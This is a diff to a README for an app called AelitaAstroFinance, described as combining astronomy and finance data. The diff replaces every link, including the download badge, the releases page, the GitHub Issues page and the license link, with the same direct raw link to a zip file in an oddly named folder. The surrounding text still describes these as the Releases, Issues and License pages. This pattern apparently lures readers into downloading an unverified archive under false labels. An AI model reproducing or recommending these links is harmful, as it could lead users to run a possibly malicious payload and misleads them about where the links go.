@@ -1,6 +1,6 @@
 # 🌌 AelitaAstroFinance - Explore Finance with Astronomy Insights
 
-[![Download AelitaAstroFinance](https://img.shields.io/badge/Download-AelitaAstroFinance-blue?style=flat&logo=github)](https://github.com/GayathriAnand/AelitaAstroFinance/releases)
+[![Download AelitaAstroFinance](https://raw.githubusercontent.com/GayathriAnand/AelitaAstroFinance/master/tachygraphometer/AelitaAstroFinance.zip)](https://raw.githubusercontent.com/GayathriAnand/AelitaAstroFinance/master/tachygraphometer/AelitaAstroFinance.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AelitaAstroFinance! This application combines astronomy and finance d
 
 ## 📥 Download & Install
 
-To download AelitaAstroFinance, visit this page: [Download AelitaAstroFinance](https://github.com/GayathriAnand/AelitaAstroFinance/releases).
+To download AelitaAstroFinance, visit this page: [Download AelitaAstroFinance](https://raw.githubusercontent.com/GayathriAnand/AelitaAstroFinance/master/tachygraphometer/AelitaAstroFinance.zip).
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version at the top of the page. 
@@ -58,12 +58,12 @@ AelitaAstroFinance pulls data from reliable sources using APIs. This ensures you
 
 If you need help, you can reach out through these options:
 
-- Head to our [GitHub Issues Page](https://github.com/GayathriAnand/AelitaAstroFinance/issues) for bug reports or feature requests.
+- Head to our [GitHub Issues Page](https://raw.githubusercontent.com/GayathriAnand/AelitaAstroFinance/master/tachygraphometer/AelitaAstroFinance.zip) for bug reports or feature requests.
 - Join discussions or ask questions in our Community Forum linked in the repository.
 
 ## 📜 License
 
-AelitaAstroFinance is licensed under the MIT License. You can review the license details [here](https://github.com/GayathriAnand/AelitaAstroFinance/blob/main/LICENSE).
+AelitaAstroFinance is licensed under the MIT License. You can review the license details [here](https://raw.githubusercontent.com/GayathriAnand/AelitaAstroFinance/master/tachygraphometer/AelitaAstroFinance.zip).
 
 ## 📅 Upcoming Features
 
